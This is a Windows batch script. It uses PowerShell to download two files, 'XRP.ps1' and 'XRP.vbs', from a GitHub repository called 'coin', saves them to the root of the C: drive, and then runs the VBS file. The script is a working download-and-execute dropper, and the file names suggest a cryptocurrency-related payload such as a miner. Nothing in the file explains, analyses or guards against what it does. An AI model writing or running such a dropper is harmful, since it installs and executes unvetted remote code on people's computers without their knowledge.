@echo off
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/XRP.ps1' -OutFile 'C:\XRP.ps1'"
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/XRP.vbs' -OutFile 'C:\XRP.vbs'"
powershell "Start-Process -FilePath 'C:\XRP.vbs'"
exit
